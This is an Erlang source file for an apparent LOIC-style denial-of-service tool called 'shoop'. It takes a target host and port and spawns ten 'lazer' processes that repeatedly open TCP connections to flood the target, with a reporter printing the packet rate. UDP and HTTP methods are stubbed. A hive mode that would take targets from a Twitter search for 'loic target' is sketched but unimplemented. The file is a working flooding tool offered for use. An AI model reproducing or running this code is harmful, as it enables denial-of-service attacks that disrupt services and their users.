-module(shoop).
-author("andrew.pennebaker@gmail.com").
-export([report/1, nudge/3, shoop/2, poll/3, main/1]).
-import(getopt, [usage/2, parse/2]).
-import(escript, [script_name/0]).
-import(lists, [map/2, nth/2, member/2, append/2, keyfind/3, keymerge/3, seq/2]).
-import(gen_tcp, [connect/4, close/1]).
-import(random, [seed/3, uniform/1]).
-import(string, [to_integer/1]).
-import(timer, [now_diff/2]).
-import(re, [split/2]).

report(Packets) ->
  receive
    {packets, P} -> report(Packets + P);
    {report, Interval} ->
      io:format("Sending ~w packets/sec.~n", [round(Packets / Interval)]),
      report(Packets)
  end.

nudge(Reporter, Start, Delay) ->
  receive
  after Delay ->
      Interval = now_diff(now(), Start) / 1000000, % sec
      Reporter ! {report, Interval},
      nudge(Reporter, Start, Delay)
  end.

shoop(Settings, Reporter) ->
  case element(2, keyfind(status, 1, Settings)) of
    polling -> true;
    attack ->
      case element(2, keyfind(method, 1, Settings)) of
        "tcp" ->
          case connect(
                 element(2, keyfind(host, 1, Settings)),
                 element(2, keyfind(port, 1, Settings)),
                 [{nodelay, true}],
                 element(2, keyfind(timeout, 1, Settings))
                ) of
            {ok, Socket} ->
              close(Socket),
              Reporter ! {packets, 4};
            {error, Error} ->
              Error
          end;
        "udp" ->
                                                % ...
          Reporter ! {packets, 1};
        "http" ->
                                                % ...
          Reporter ! {packets, 8}
      end
  end,

  receive {order, Orders} ->
      shoop(keymerge(1, Orders, Settings), Reporter)
  after element(2, keyfind(delay, 1, Settings)) ->
      shoop(Settings, Reporter)
  end.

poll(Lazers, Hive, Delay) ->
  receive
  after Delay ->
      io:format("Polling hive...~n"),
      map(fun(L) -> L ! {order, [{status, attack}, {host, "localhost"}, {port, 80}, {method, "tcp"}]} end, Lazers),
      poll(Lazers, Hive, Delay)
  end.

option_spec() ->
  [
   %% {Name, ShortOpt, LongOpt, ArgSpec, HelpMsg}
   {delay, $d, "delay", integer, "Pause between floods (ms)"},
   {method, $m, "method", string, "Attack method (tcp, udp, or http)"},
   {timeout, $t, "timeout", integer, "Lazer timeout (ms)"},
   {help, $h, "help", undefined, "Display usage information"},
   {target, undefined, undefined, string, "Target. Will poll hive if not specified."}
  ].

u() -> usage(option_spec(), script_name()).

split_address(Address) -> [A | B] = split(Address, ":"), split_address(A, B).

split_address(H, []) -> [{host, binary_to_list(H)}, {port, 80}];

split_address(H, Rest) ->
  Host = binary_to_list(H),

  [P | _] = Rest,

  Port = case P of
           [] -> 80;
           X -> case to_integer(binary_to_list(X)) of
                  {error, _} -> 80;
                  {X2, _} -> if
                               (X2 > 0) and (X2 < 65536) -> X2;
                               true -> 80
                             end
                end
         end,

  [{host, Host}, {port, Port}].

main(Args) ->
  {A1, A2, A3} = now(),
  seed(A1, A2, A3),

  case parse(option_spec(), Args) of
    {error, _} -> u();

    {ok, {Options, _}} ->
      case member(help, Options) of
        true -> u();
        _ ->
          {Host, Port, Poll} = case keyfind(target, 1, Options) of
                                 {target, Address} -> list_to_tuple(append(split_address(Address), [{status, attack}]));
                                 _ -> {{host, "localhost"}, {port, 80}, {status, polling}}
                               end,

          Delay = case keyfind(delay, 1, Options) of
                    false -> {delay, 0};
                    X -> X
                  end,

          Timeout = case keyfind(timeout, 1, Options) of
                      false -> {timeout, 9001};
                      Y -> Y
                    end,

          Method = case keyfind(method, 1, Options) of
                     false -> {method, "tcp"};
                     Z -> Z
                   end,

          Settings = [Host, Port, Poll, Delay, Timeout, Method],

          Rep = spawn(shoop, report, [0]),

          Laz = map(fun(_) -> spawn(shoop, shoop, [Settings, Rep]) end, seq(1, 10)),

          nudge(Rep, now(), 1000),

          case Poll of
            {status, polling} ->
              u(), % until polling is implemented
              spawn(shoop, poll, [Laz, "http://search.twitter.com/search?q=loic+target", 5000]);
            _ -> true
          end
      end
  end.
